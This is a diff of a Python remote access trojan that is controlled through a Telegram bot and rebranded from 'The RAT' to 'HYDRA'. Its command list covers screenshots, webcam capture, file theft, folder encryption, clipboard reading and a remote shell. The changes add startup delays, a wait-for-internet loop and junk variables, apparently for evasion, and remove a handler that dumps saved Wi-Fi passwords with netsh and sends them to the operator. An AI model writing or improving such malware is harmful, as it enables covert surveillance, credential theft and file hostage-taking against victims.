@@ -9,10 +9,35 @@ import platform
 import clipboard
 import subprocess
 import pyAesCrypt
-import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
+import requests
+from time import sleep
 
-TOKEN = '*************:**************-**************_**-*'  
+sleep(60)
+Author="HARSHV_2003"
+sum=0
+a="ab________rjgrghrjghrjgrjgirghbirugbrughrughrg=="
+b=434434
+for i in range(5):
+    sum+=1
+
+
+def is_connected_to_internet():
+  """Returns True if there is an active internet connection, False otherwise."""
+  try:
+    requests.get("https://google.com", timeout=3)
+    return True
+  except:
+    return False
+
+while(is_connected_to_internet()==False):
+    sleep(10)
+    # print("STRUCKED!")
+    
+# print("WORKING !")
+
+sleep(45)
+TOKEN = ''   
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
@@ -22,11 +47,11 @@ bot.set_webhook()
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, 'Welcome! To The RAT\n\nMade by @RituRajPS')
+    bot.send_message(message.chat.id, 'Welcome! To The HYDRA \n\nMade by @SUDO')
 
 @bot.message_handler(commands=['help'])
 def help_msg(message):
-    help_text = 'Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown'
+    help_text = 'Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/speech [hi] \n/shutdown'
     bot.send_message(message.chat.id, help_text)
 
 @bot.message_handler(commands=['screen'])
@@ -341,40 +366,9 @@ def send_long_message(user_id, message_text):
         bot.send_message(user_id, part)
 
 
-@bot.message_handler(commands=['wifi'])
-def get_wifi_passwords(message):
-    try:
-        
-        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
-
-        
-        with open('Wi-Fi-App.xml', 'r') as file:
-            xml_content = file.read()
-
-      
-        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
-        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
-
-        if ssid_match and password_match:
-            ssid = ssid_match.group(1)
-            password = password_match.group(1)
-
-            message_text = f"SSID: {ssid}\nPASS: {password}"
-            bot.send_message(message.chat.id, message_text)
-            try:
-                os.remove("Wi-Fi-App.xml")
-            except:
-                pass
-        else:
-            bot.send_message(message.chat.id, "NOT FOUND.")
-
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
 try:
     if __name__ == "__main__":
-        print('Waiting for commands...')
+        print(' ')
         try:
             bot.infinity_polling()
         except:
